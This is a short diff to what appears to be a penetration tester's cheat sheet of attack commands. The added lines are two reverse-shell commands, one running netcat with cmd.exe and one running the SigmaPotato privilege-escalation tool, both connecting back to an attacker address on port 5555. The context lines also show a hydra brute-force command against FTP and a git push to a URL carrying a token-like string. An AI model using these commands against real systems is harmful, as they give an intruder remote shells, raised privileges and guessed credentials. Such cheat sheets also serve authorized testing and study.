@@ -279,7 +279,8 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 ## Infrastructure
 [*] Shells
-nc.exe $MYIP 5555 -e cmd.exe
+"powershell -c C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe"
+"powershell -c C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555"
 
 [*] (21) FTP
 hydra -L usernames -P passwords ftp://$TARGET -t35
